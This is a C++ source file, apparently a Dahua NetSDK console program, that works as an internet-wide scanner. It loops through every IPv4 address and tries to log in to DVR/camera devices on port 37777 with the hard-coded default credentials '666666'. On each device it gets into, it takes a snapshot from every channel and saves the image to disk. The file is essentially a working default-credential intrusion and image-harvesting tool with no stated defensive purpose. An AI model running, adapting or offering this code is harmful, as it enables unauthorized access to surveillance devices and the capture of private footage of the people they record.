// test.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <sstream>
#include <atlstr.h>
#include <iostream>
#include <conio.h>
#include "dhnetsdk.h"
using namespace std;

int m_nChannelCount;
string ip;

string int2str(int input) {
	stringstream ss;
	ss << input;
	return ss.str();
}


void OnOnePicture(LONG ILoginID, BYTE *pBuf, UINT RevLen, UINT EncodeType, UINT CmdSerial)
{

	//Get file name
	string fileName(ip);
	fileName.append("_");
	fileName.append(int2str(CmdSerial));
	fileName.append(".jpg");

	cout << "Save image." << fileName.c_str() << endl;
	/* Save image original file */
	FILE *stream;
	if( (stream = fopen((const char*) fileName.c_str(), "wb")) != NULL )
	{
		int numwritten = fwrite( pBuf, sizeof( char ), RevLen, stream );
		fclose( stream );
	}
	
}

void CALLBACK DisConnectFunc(LONG m_LoginID, char *pchDVRIP, LONG nDVRPort, DWORD dwUser)
{
	cout << "Disconnect." << endl;
	return;
}

void CALLBACK AutoConnectFunc(LONG m_LoginID,char *pchDVRIP,LONG nDVRPort,DWORD dwUser)
{
	cout << "Reconnect" << endl;
	return;
}
void CALLBACK SnapPicRet(LLONG ILoginID, BYTE *pBuf, UINT RevLen, UINT EncodeType, DWORD CmdSerial, LDWORD dwUser)
{
	cout << "SnapPicRet callback." << endl;
	OnOnePicture(ILoginID,pBuf,RevLen,EncodeType,CmdSerial);
}

int _tmain(int argc, _TCHAR* argv[])
{
	NET_DEVICEINFO deviceInfo ={0};
	unsigned long m_LoginID;
	
	BOOL ret = CLIENT_Init(DisConnectFunc,0); 

	if(ret) {

		CLIENT_SetSnapRevCallBack(SnapPicRet,0);	

		cout << "Init OK." << endl;
	} else {
		cout << "Init Fail." << endl;
	}

	for (int a = 0; a <= 255; a++){
		for( int b = 0; b <= 255; b++){
			for( int c = 0; c <= 255; c++){
				for( int d = 0; d <= 255; d++){

					ip.assign(int2str(a));
					ip.append(".");
					ip.append(int2str(b));
					ip.append(".");
					ip.append(int2str(c));
					ip.append(".");
					ip.append(int2str(d));


					char *cstr = new char[ip.length() + 1];
					strcpy(cstr, ip.c_str()); 

					m_LoginID = CLIENT_Login(cstr,37777,"666666","666666",&deviceInfo);

					delete cstr;

					if(m_LoginID == 0)
					{
						cout << "Login fail. ( " << ip <<  " )" << endl;
					}
					else
					{
						int nRetLen = 0;
						NET_DEV_CHN_COUNT_INFO stuChn = { sizeof(NET_DEV_CHN_COUNT_INFO) };
						stuChn.stuVideoIn.dwSize = sizeof(stuChn.stuVideoIn);
						stuChn.stuVideoOut.dwSize = sizeof(stuChn.stuVideoOut);
						CLIENT_QueryDevState(m_LoginID, DH_DEVSTATE_DEV_CHN_COUNT, (char*)&stuChn, stuChn.dwSize, &nRetLen);
						m_nChannelCount = __max(deviceInfo.byChanNum,stuChn.stuVideoIn.nMaxTotal);

						cout << "Login ok. ( " << ip <<  " )" << endl;

						for(int i=0; i<m_nChannelCount ; i++) { 
							SNAP_PARAMS snapparams = {0};
							snapparams.mode = 0;
							snapparams.Channel = i;
							snapparams.CmdSerial = i;
							if(CLIENT_SnapPicture(m_LoginID, snapparams)) {
								cout << "Snap OK." << endl;
								//_getch();
							} else {
								cout << "Snap Fail." << endl;
								//_getch();
							}
						}
					}
					Sleep(3000);
					CLIENT_Logout(m_LoginID);
					cout << "Client logout." << endl;
				}
			}
		}
	}

	CLIENT_Cleanup();
	cout << "Client cleanup." << endl;

	return 0;

}

